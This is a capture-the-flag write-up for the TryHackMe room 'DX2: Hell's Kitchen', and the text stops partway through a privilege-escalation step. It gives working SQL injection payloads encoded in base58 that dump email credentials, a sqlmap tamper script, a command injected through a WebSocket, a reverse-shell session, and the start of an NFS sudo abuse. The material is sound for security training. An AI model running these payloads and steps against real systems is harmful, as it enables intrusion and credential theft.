<h1 align="center">DX2: Hell´s Kitchen</h1>
<p align="center">2025, October 18 - 2026, January 17  &nbsp; •  &nbsp; Access this challenge <a href="https://tryhackme.com/room/dx2hellskitchen">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/31800efd-4cdf-43c2-a3a0-0baa70ad62bf"></p>


<h2>Task 1 . Investigate the server of an associate</h2>
<p>We need to recover the lost Ambrosia shipment from the NSF (National Secessionist Forces), the only treatment for the plague known as the Grey Death. However, we haven't located their main base of operations.<br>

What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.<br>

Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.</p>

<p><em>Answer the questions below</em></p>

<br>
<h1 align="center">Static Host Mapping</h1>

```bash
xx.xxx.xx.xxx dx2.thm
```

<br>
<h1 align="center">Port Scanning</h1>

```bash
:~# nmap -p- -T4 dx2.thm
...
PORT     STATE SERVICE
80/tcp   open  http
4346/tcp open  elanlm
```

```bash
:~# nmap -sC -sV -p80,4346 -T4 dx2.thm
...
PORT     STATE SERVICE VERSION
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 859
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <title>Welcome to the 'Ton!</title>
|     <link rel="stylesheet" href="static/style.css"></link>
|     </head>
|     <body>
|     <div class="main">
|     <img src="static/hotel-logo.webp" alt="The 'Ton Hotel" />
|     <h1>Welcome to the 'Ton!</h1>
|     <h2>Fine Hotel Rooms, Hell's Kitchen, New York</h2>
|     <button id="booking" disabled>Book your Room</button>
|     <button onclick="window.location.href='/guest-book'">Guest Book</button>
|     <button onclick="window.location.href='/about-us'">About Us</button>
|     <img src="static/TonOutside.webp" alt="View from the Street" width="800px" />
|     </div>
|     <div class="footer">Copyright @ 2052</div>
|     <script src="static/check-roo
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     content-length: 0
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     content-length: 0
|     connection: close
|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
|_http-title: Welcome to the 'Ton!
4346/tcp open  elanlm?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 10909
|     date: Sat, 18 Oct 2025 xx:xx:xx GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>NYCCOM.USERS.PUB</title>
|     <style>
|     html, body {
|     height: 100%;
|     background-color: black;
|     color: white;
|     font-family: 'Courier New', Courier, monospace;
|     font-size: 1em;
|     body {
|     margin: 0;
|     display: flex;
|     align-items: center;
|     justify-content: center;
|     .background {
|     width: 28em;
|     height: 7em;
|     background-color: #777;
|     position: absolute;
|     border-radius: 1em;
|     border: 0.2em solid #999;
|     clip-path: polygon(75% 0, 100% 100%, 100% 100%, 0 100%, 0 0);
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|_    date: Sat, 18 Oct 2025 xx:xx:xx GMT
```

<img width="1296" height="848" alt="image" src="https://github.com/user-attachments/assets/77a45ebd-089b-443b-b125-4a3d43d32a87" />

<br>
<h1 align="center">Directory and File Enumeration</h1>


```bash
:~/DX2HellsKitchen# dirsearch -u http://dx2.thm
...
Target: http://dx2.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -    1KB - /about-us
[xx:xx:xx] 404 -   14B  - /static/dump.sql

Task Completed
```

```bash
:~/DX2HellsKitchen# gobuster dir -u http://dx2.thm:4346/ -w /usr/share/wordlists/dirb/common.txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dx2.thm:4346/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 403) [Size: 0]
/ws                   (Status: 403) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

```bash
:~/DX2HellsKitchen# dirsearch -u http://dx2.thm:4346/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
...
Target: http://dx2.thm:4346/

[xx:xx:xx] Starting: 
[xx:xx:xx] 403 -    0B  - /mail
[xx:xx:xx] 403 -    0B  - /ws

Task Completed
```

<br>
<h1 align="center">Web 80</h1>

<img width="1183" height="808" alt="image" src="https://github.com/user-attachments/assets/78ea176f-eec6-48d2-ad3a-69d6f8c91170" />

<br>
<br>
<br>

<img width="1185" height="777" alt="image" src="https://github.com/user-attachments/assets/81e5d6e9-d32d-44ed-b08c-803956b94f18" />

<br>
<br>
<br>
<p>dx2.thm</p>


```bash
:~/DX2HellsKitchen# curl dx2.thm
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Welcome to the 'Ton!</title>
        <link rel="stylesheet" href="static/style.css"></link>
    </head>
    <body>
        <div class="main">
            <img src="static/hotel-logo.webp" alt="The 'Ton Hotel" />
            <h1>Welcome to the 'Ton!</h1>
            <h2>Fine Hotel Rooms, Hell's Kitchen, New York</h2>
            <button id="booking" disabled>Book your Room</button>
            <button onclick="window.location.href='/guest-book'">Guest Book</button>
            <button onclick="window.location.href='/about-us'">About Us</button>
            <img src="static/TonOutside.webp" alt="View from the Street" width="800px" />
        </div>
        <div class="footer">Copyright @ 2052</div>
        <script src="static/check-rooms.js"></script>
    </body>
</html>
```

<br>
<p>dx2.thm/guest-book</p>

```bash
:~/DX2HellsKitchen# curl dx2.thm/guest-book
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Guest Book</title>
        <link rel="stylesheet" href="static/style.css"></link>
    </head>
    <body>
        <div class="main">
            <a href="/"><img src="static/hotel-logo.webp" alt="The 'Ton Hotel" /></a>
            <h1>Guest Book</h1>
            <img src="static/guest-book.webp" alt="View from the Street" />
            <div>Current long-term guests are listed below (please note only guests who opt-in are placed on this list)</div>
            <br/>
            <div>To contact a guest, please call reception</div>
            <br/>
            <div align="center">
                <table border="1">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>City of Origin</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Gully Foyle</td>
                            <td>New York</td>
                        </tr>
                        <tr>
                            <td>Gabriel Syme</td>
                            <td>London, England</td>
                        </tr>
                        <tr>
                            <td>Paul Denton</td>
                            <td>New York</td>
                        </tr>
                        <tr>
                            <td>Oberst Enzian</td>
                            <td>Sudwest, Africa</td>
                        </tr>
                        <tr>
                            <td>Smilla Jasperson</td>
                            <td>Copenhagen, Denmark</td>
                        </tr>
                        <tr>
                            <td>Hippolyta Hall</td>
                            <td>Los Angeles</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <div class="footer">Copyright @ 2052</div>
    </body>
</html>
```

```bash
Name              City of Origin
Gully Foyle       New York
Gabriel Syme      London, England
Paul Denton       New York
Oberst Enzian     Sudwest, Africa
Smilla Jasperson  Copenhagen, Denmark
Hippolyta Hall    Los Angeles
```

<br>
<p>/static/check-room.js</p>

<img width="1116" height="442" alt="image" src="https://github.com/user-attachments/assets/b41f8097-f3a0-419f-9a7d-4107fa8066aa" />

<br>
<br>

```bash
fetch('/api/rooms-available').then(response => response.text()).then(number => {
    const bookingBtn = document.querySelector("#booking");
    bookingBtn.removeAttribute("disabled");
    if (number < 6) {
        bookingBtn.addEventListener("click", () => {
            window.location.href = "new-booking";
        });
    } else {
        bookingBtn.addEventListener("click", () => {
            alert("Unfortunately the hotel is currently fully booked. Please try again later!")
        });
    }
});
```

<img width="583" height="244" alt="image" src="https://github.com/user-attachments/assets/f8ead618-e7c8-47ff-b514-9a1fde188f68" />

<br>
<br>
<br>
<p>Book Your Room<br>dx2.thm/new-booking<br><em>Unfortunately the hotel is currently fully booked. Please try again later!</em><br><br>
About Us<br>dx2.thm/about-us<br><em>Tom hotel is owned and operated by the Rentons ... Gilberto Renton ... Sanda Renton ...</em></p>

<img width="1241" height="770" alt="image" src="https://github.com/user-attachments/assets/d9247e47-9c11-46ba-aa36-fc6d5a44431a" />

<br>
<br>
<br>
<p>dx2.thm/new-booking</p>

<img width="1054" height="276" alt="image" src="https://github.com/user-attachments/assets/8616e766-dcdd-441b-9872-a4e869653085" />

<br>
<br>
<br>
<p>Identify <strong>/static/new-booking.js</strong> in the source code.</p>
<img width="1058" height="359" alt="image" src="https://github.com/user-attachments/assets/ede43fb3-685e-4029-843d-90100b02b760" />

<br>
<br>
<br>
<p>Inspect <strong>/new-booking</strong> and identify <strong>booking_key</strong> from <strong>booking-info</strong>.</p>
<img width="1112" height="575" alt="image" src="https://github.com/user-attachments/assets/c8fdba14-33a1-4e57-a46e-c26ea071ad1a" />

<br>
<br>
<br>

<img width="1109" height="487" alt="image" src="https://github.com/user-attachments/assets/d02d78b4-ef87-4367-be16-17fc82b6f647" />

<br>
<br>
<br>
<p>Check <strong>/static/new-booking.js</strong></p>

<img width="1059" height="186" alt="image" src="https://github.com/user-attachments/assets/46974c89-39da-4261-ad89-87ebe4bfb84b" />

<br>
<br>
<br>

<p>Decode the <strong>booking_key</strong> value.</p>
<img width="1355" height="187" alt="image" src="https://github.com/user-attachments/assets/4ea08649-ed4a-413f-9096-85c42afccc81" />


<br>
<br>
<h1 align="center">Exploitation  •  SQL Injection</h1>

<p><code>booking_id:1' UNION SELECT 1,2 -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=ApfkkDrFctMBrXvW3fJPqtgiyDhrqKLGAWqaQpgwBY91n3Pa
{"room_num":"1","days":"2"}
```

<br>
<br>
<p><code>booking_id:' UNION SELECT 1,sqlite_version()  -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLite version <code>3.42.0</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,sqlite_version()  -- -"|base58); echo ' '
{"room_num":"1","days":"3.42.0"}
```

<br>
<br>
<p><code>booking_id:1' UNION SELECT 1,sqlite_version() -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLite version <code>3.42.0</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=2DM1mNyoCy8z33ctQNHz7tsjQhQwGGJ7BfAkBoWA2fLSzeW1rezWoJm7LdfsGxVyg8EnY
{"room_num":"1","days":"3.42.0"}
```

<br>
<br>
<p><code>booking_id:' UNION SELECT 1,sql FROM sqlite_schema -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TABLE <code>bookings_temp</code> containing fields <code>booking_id</code>, <code>room_num</code>, and <code>days</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,sql FROM sqlite_schema -- -"|base58); echo ' '
{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"} 
```

<br>
<br>
<p><code>booking_id:1' UNION SELECT 1,sql FROM sqlite_schema -- -</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TABLE <code>bookings_temp</code> containing fields <code>booking_id</code>, <code>room_num</code>, and <code>days</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=3fcdDXstvQBMjWHxTTY4rSpJ6j94tbFcTa7mQHUhBQKPjaSNqvhXzbC5knNsCQxwVfve8CVBUgAQk
{"room_num":"1","days":"CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)"}
```

<br>
<br>
<p><code>booking_id:' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite%' -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite%' -- -"|base58); echo ' '
{"room_num":"1","days":"email_access,reservations,bookings_temp"}
```

<br>
<br>
<p><code>curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:1' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password, '\n'),2 FROM email_access;-- -"|base58); echo ' '</code> OR the command below</p>

```bash
:~/DX2HellsKitchen#curl -s http://dx2.thm/api/booking-info?booking_key=28uzZhxu35QQSAfpeyWEk2NXWtaUD4vnoC9KJf9EdWtAvxfpsqMMMGVpik7aQW3BwB1GcbH66hZ92zK7z6Y4ex789wBYP61pVpF9mXiLhERNz5zR9TseLJpjTTVZXSnSJTYvLSgCekVS2GcfyqtjBPTZD2TiCULD1xansd7DGJtNUbVHQZxzQ | jq
{
  "room_num": "Gully Foyle:NEVER LOGGED IN:\\nGabriel Syme:NEVER LOGGED IN:\\nOberst Enzian:NEVER LOGGED IN:\\nPaul Denton:-------:-------------\\nSmilla Jasperson:NEVER LOGGED IN:\\nHippolyta Hall:NEVER LOGGED IN:",
  "days": "2"
}
```

<br>
<br>
<p><code>booking_id:' UNION SELECT group_concat(email_username), group_concat(EMAIL_pASSWORD) from email_access -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT group_concat(email_username), group_concat(EMAIL_pASSWORD) from email_access -- -"|base58); echo ' '
{"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,-------,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,-------------,,"} 
```

<br>
<br>
<p><code>booking_id:' UNION SELECT email_username, email_password from email_access LIMIT 1 OFFSET 1 -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=$(echo -n "booking_id:' UNION SELECT email_username, email_password from email_access LIMIT 1 OFFSET 1 -- -"|base58); echo ' '
{"room_num":"-------","days":"-------------"}
```

<br>
<br>
<p><code>booking_id:1' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=3HN9EcFJMeWBq54x2Tk9DEGmpUKqvuGUDMnicRgmKLtQCKGoDqqz3iCpif7zzSjFD3qmzCJjZCP1uBpnTEsvgSs4oSALTFZ5FiRyV5aJfBz2MSBKDr5tk2nxZ3tYduYKgRvgakxTrRzntzzmdV4bmM1RVnzUCZAeVTocrhWZBuH428
{"room_num":"1","days":"email_access,reservations,bookings_temp"}
```

<br>
<br>
<p><code>booking_id:1' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='email_access' -- -</code></p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=ACnMHD6J1XxN7kQu7LfMQWxJfpuVYz2wM2CXcUt398ns3iDxcvLbJ7mcbRKsN1Uk3p8MDfdmnsunVpCev7yTL4AaS7zvCz6ZtckRNq6yVA49Uy2QT4Rx7LKXTdpJiM8QsdNHpFuyma6Ugtkygvyka7ZQT2C3P7tQ
{"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
```

<br>
<br>
<p><code>booking_id:1' UNION SELECT group_concat(email_username),group_concat(email_password) FROM email_access -- -</code></p>

<p>------- : -------------</p>

```bash
:~/DX2HellsKitchen# curl http://dx2.thm/api/booking-info?booking_key=e7Zicyo9Kq2pk6Ta8E7kEFnsVi7p2VAXKYEfVHZGpseKw9x3o8pAxGhdUhy6EYJanhRv9aMwyu8CKq9maeLfk8QHjEALv2j2B8WLyWypECM8R7bWhWBqf4GpXnyAcicrNuza7Qeb7m4riuWuWc
{"room_num":"NEVER LOGGED IN,NEVER LOGGED IN,NEVER LOGGED IN,-------,NEVER LOGGED IN,NEVER LOGGED IN","days":",,,-------------,,"}
```

<br>
<br>
<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -</code></p>

```bash
:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58)
{"room_num":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)
  \\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)
  \\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
"days":"2"
}
```

<br>
<br>
<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -</code></p>

```bash
:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58) | jq -r
{
  "room_num": "CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)
   \\nCREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)
   \\nCREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)",
  "days": "2"
}
```

<br>
<br>
<p><code>booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -</code></p>

```bash
:~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password,'\n'),2 FROM email_access;-- -" | base58) | jq -r
{
  "room_num": "Gully Foyle:NEVER LOGGED IN:
  \\nGabriel Syme:NEVER LOGGED IN:
  \\nOberst Enzian:NEVER LOGGED IN:
  \\nPaul Denton:-------:-------------
  \\nSmilla Jasperson:NEVER LOGGED IN:
  \\nHippolyta Hall:NEVER LOGGED IN:",
  "days": "2"
}
```


<br>
<br>
<h1 align="center">Web 4346</h1>
<p>Log in dx2.thm:4346</p>

<img width="1107" height="345" alt="image" src="https://github.com/user-attachments/assets/dac51eb9-9467-4dd1-908e-e99dc51391ef" />

<br>
<br>
<p>View code source.</p>
<img width="1204" height="281" alt="image" src="https://github.com/user-attachments/assets/b93846cd-00b1-410e-9501-d03e0717ad06" />

<br>
<br>
<p>View it beautified.</p>

<img width="1341" height="482" alt="image" src="https://github.com/user-attachments/assets/8e615991-314e-4287-b2d6-6b9e56685f0f" />

<br>
<br>

```bash
   < script type = "text/javascript" >
       let elems = document.querySelectorAll(".email_list .row");
   for (var i = 0; i < elems.length; i++) {
       elems[i].addEventListener("click", (e => {
           document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
           let t = e.target.parentElement.getAttribute("data-id"),
               n = e.target.parentElement.querySelector(".col_from").innerText,
               r = e.target.parentElement.querySelector(".col_subject").innerText;
           document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
               document.querySelector("#email_content").innerText = atob(e)
           }))
       })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
           e.preventDefault(), window.location.href = "/"
       }))
   }
   const wsUri = `ws://${location.host}/ws`;
   socket = new WebSocket(wsUri);
   let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
   socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3); <
   /script>
```         

<br>
<br>
<h1 align="center">Email Enumeration</h1>
<br>
<p>Read the emails.<br>Click over the subject to see another email.</p>

<img width="1036" height="693" alt="image" src="https://github.com/user-attachments/assets/384fde30-94d2-4eb7-9bc3-b4a557a8a6c4" />

<br>
<br>

<img width="1197" height="710" alt="image" src="https://github.com/user-attachments/assets/3327e02b-4689-42d6-8944-a0c7580b165e" />

<br>
<br>
<p>1.1. <em>What is the Web flag?</em> Hint: Don't forget to read everything!<br>
<code>thm{•••••••••••••••••••••••••••••••••••••••••}</code></p>
<br>

<img width="1203" height="712" alt="image" src="https://github.com/user-attachments/assets/6b993e1c-abf9-4533-8ef8-2c1a63c01094" />

<br>
<br>

<img width="1203" height="709" alt="image" src="https://github.com/user-attachments/assets/a52d36fd-8eff-430c-a04c-92800a45d4d9" />

<br>
<br>

<img width="1204" height="722" alt="image" src="https://github.com/user-attachments/assets/9b796e44-8221-4810-8836-35af8a63e398" />

<br>
<br>
<br>
<p>You can also read the emails using the following approach:</p>

<br>
<p>

- navigate to /api/message?message_id=1</p>

<img width="1039" height="120" alt="image" src="https://github.com/user-attachments/assets/edb87adf-5308-432b-83df-d495260d9382" />

<br>
<br>

<img width="814" height="281" alt="image" src="https://github.com/user-attachments/assets/3bed9e95-767d-4db8-b0a7-817a279acef4" />

<br>
<br>
<p>

- navigate to /api/message?message_id=2</p>

<img width="1039" height="89" alt="image" src="https://github.com/user-attachments/assets/b73af3d9-6ac1-44fb-aa2c-61ded4d8e2d9" />

<br>
<br>

<img width="834" height="484" alt="image" src="https://github.com/user-attachments/assets/054a79eb-7c43-45b2-bdae-f2697586d5d0" />

<br>
<br>
<p>

- navigate to /api/message?message_id=3</p>

<img width="1039" height="71" alt="image" src="https://github.com/user-attachments/assets/3191102a-11bb-427b-a0f9-b51058e4e73f" />

<br>
<br>

<img width="829" height="321" alt="image" src="https://github.com/user-attachments/assets/5d65880f-e476-400a-a55b-f2e98171db05" />

<br>
<br>
<p>

- navigate to /api/message?message_id=4</p>

<img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/23b6eb36-a4d1-4adf-b348-bff093f833af" />

<br>
<br>
<p>

- navigate to/api/message?message_id=5</p>

<img width="826" height="352" alt="image" src="https://github.com/user-attachments/assets/f67f93b7-0584-4841-8fad-b01d09dc4cc6" />

<br>
<br>
<br>
<br>
<br>
<br>
<br>

```bash
:~/DX2HellsKitchen# cat script.py
from lib.core.enums import PRIORITY
import base58

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Encode the payload with base58 :)
    """
    if payload:
        prefixed_payload = f"booking_id:{payload}"
        encoded_payload = base58.b58encode(prefixed_payload.encode()).decode()
        return encoded_payload
    return payload
```

```bash
:~/DX2HellsKitchen# touch __init__.py
```

```bash
:~/DX2HellsKitchen# sqlmap -u "http://dx2.thm/api/booking-info?booking_key=" -p "booking_key" --tamper=script.py --dbms=sqlite --random-agent --level=5 --risk=3 --dump
```

<img width="1336" height="711" alt="image" src="https://github.com/user-attachments/assets/d0d895e9-2984-4147-9971-b9f6aeab5cfc" />

<br>
<br>

<img width="1337" height="745" alt="image" src="https://github.com/user-attachments/assets/1e2340cb-0c51-463b-afcd-427f60b62757" />

<br>
<br>
<h3 align="center">WebSockets history</h3>
<p>

- Launch Burp Suite<br>
- Click <strong>Proxy</strong><br>
- Click <strong>WebSockets history</strong><br>
- Right-click over an item<br>
- Send to <strong>Repeater</strong><br>
- Customize<br>
- Send</p>

<img width="1162" height="132" alt="image" src="https://github.com/user-attachments/assets/da357631-9efe-414c-b474-119ece74e164" />

<br>
<br>

<img width="1154" height="124" alt="image" src="https://github.com/user-attachments/assets/7320079a-5eef-4c4a-b282-0df8accd674c" />

<br>
<br>

<img width="1156" height="103" alt="image" src="https://github.com/user-attachments/assets/aa70438d-df8e-43b1-bac9-fa4a7fb3294b" />

<br>
<br>

<img width="1172" height="581" alt="image" src="https://github.com/user-attachments/assets/a2212078-8e5e-4b44-8089-bc388d655512" />

<br>
<br>
<br>

```bash
Europe/London;cat /srv/.dad;
```

```bash
i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: ---------------. -S
Sat 18 Oct 2025 10:11:58 PM UTC
```

```bash
Europe/London;ls /home/;
```

```bash
gilbert
jojo
sandra
Sat 18 Oct 2025 10:15:26 PM UTC
```



<img width="1273" height="139" alt="image" src="https://github.com/user-attachments/assets/aa9e3df7-c556-4f4b-a26c-88bb30483d8a" />

<br><br><br>

```bash
:~/DX2HellsKitchen# curl -X POST -d "user_name=-------&pass_word=-------------" http://xx.xxx.xx.xx:4346
```

<br>
<br>

<img width="956" height="392" alt="image" src="https://github.com/user-attachments/assets/48cea5b2-755a-45c3-8ea5-8bf5e4b34146" />

<br>
<br>

<img width="1316" height="712" alt="image" src="https://github.com/user-attachments/assets/c8f381c6-1af5-4ac9-b38b-e6e64dbd86a0" />

<br>
<br>
<br>
<h1 align="center">Shell as gilbert</h1>

```bash
:~$ sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on xx.xxx.xxx ...
id
uid=1001(gilbert) gid=1001(gilbert) groups=1001(gilbert)
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
gilbert@tonhotel:/$ ^Z
[1]+  Stopped                 sudo nc -nlvp 443
:~$ stty raw -echo; fg
sudo nc -nlvp 443

gilbert@tonhotel:/$ export TERM=xterm
```

```bash
gilbert@tonhotel:/$ pwd
/
```

```bash
gilbert@tonhotel:/$ whoami
gilbert
```

```bash
gilbert@tonhotel:/$ cd home
```

```bash
gilbert@tonhotel:/home$ ls
gilbert  jojo  sandra
```

```bash
gilbert@tonhotel:/home$ cd gilbert
```

```bash
gilbert@tonhotel:~$ ls
dad.txt  hotel-jobs.txt
```

```bash
gilbert@tonhotel:~$ cat dad.txt
left you a note by the site -S
```

```bash
gilbert@tonhotel:~$ cat hotel-jobs.txt
hotel tasks, q1 52

- fix lights in the elevator shaft, flickering for a while now
- maybe put barrier up in front of shaft, so the addicts dont fall in
- ask sandra AGAIN why that punk has an account on here (be nice, so good for her to be home helping with admin)
- remember! '---------------'

buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl
gilbert@tonhotel:~$
```

<img width="1300" height="322" alt="image" src="https://github.com/user-attachments/assets/e9d453b2-9d0e-4f2b-a152-daa86c143ff9" />

<br>
<br>
<br>
<br>
<br>
<br>
<h1 align="center">Shell as sandra</h1>

```bash
gilbert@tonhotel:/$ su sandra
Password:
$ pwd
/
$ id
uid=1002(sandra) gid=1002(sandra) groups=1002(sandra)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
sandra@tonhotel:/$
```

```bash
sandra@tonhotel:/$ cd /home/sandra
```

```bash
sandra@tonhotel:~$ ls
note.txt  Pictures  user.txt
```

```bash
sandra@tonhotel:~$ cat user.txt
thm{•••••••••••••••••••••••••••••••}
```

```bash
sandra@tonhotel:~$ cat note.txt
Tasks
-give boss access to home server, in exchange for a few nights break (DONE)
-get bags and stash ready
-talk to smuggler, see if he can get me a job out of the city and away from jojo's people
sandra@tonhotel:~$
```

```bash
sandra@tonhotel:~$ ls
note.txt  Pictures  user.txt
```

```bash
sandra@tonhotel:~$ cat user.txt
thm{••••••••••••••••••••••••••••••••••••••••}
```

<br>
<p>1.2. <em>What is the User flag?</em> Hint : Sometimes almost all ways out are closed...<br>
<code>thm{••••••••••••••••••••••••••••••••••••••••}</code></p>
<br>

```bash
sandra@tonhotel:~$ ls -la Pictures/
...
-rw-rw---- 1 sandra sandra 32637 Sep  7  2023 boss.jpg
```

<br>
<p>

- transfer <strong>boss.jpg</strong> to your VM and identify <strong>jojo</strong>´s password</p>

<img width="994" height="446" alt="image" src="https://github.com/user-attachments/assets/a33a43d9-9e7a-49cd-9c02-9c30287fe708" />

<br>
<br>
<br>
<h1 align="center">Shell as jojo</h1>

```bash
sandra@tonhotel:/home$ su jojo
Password:
$ whoami
jojo
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
jojo@tonhotel:~$ sudo -l
User jojo may run the following commands on tonhotel:
    (root) /usr/sbin/mount.nfs
jojo@tonhotel:~$
```

<br>
<br>
<br>
<p>Create a share in your attack virtual machine</p>

```bash
:~/DX2HellsKitchen# mkdir /tmp/share
```

<br>
<p>change the ownership of the sare you created to a low-privilege user <code>nobody</code> and group <code>nogroup</code>.</p>

```bash
:~/DX2HellsKitchen# sudo chown nobody:nogroup /tmp/share
```

```bash
:~/DX2HellsKitchen# sudo chmod 777 /tmp/share
```

```bash
:~/DX2HellsKitchen# sudo chmod +s /tmp/share
```


<br>
<p>Update <strong>/etc/nsf.conf</strong> to open on port=443</p>

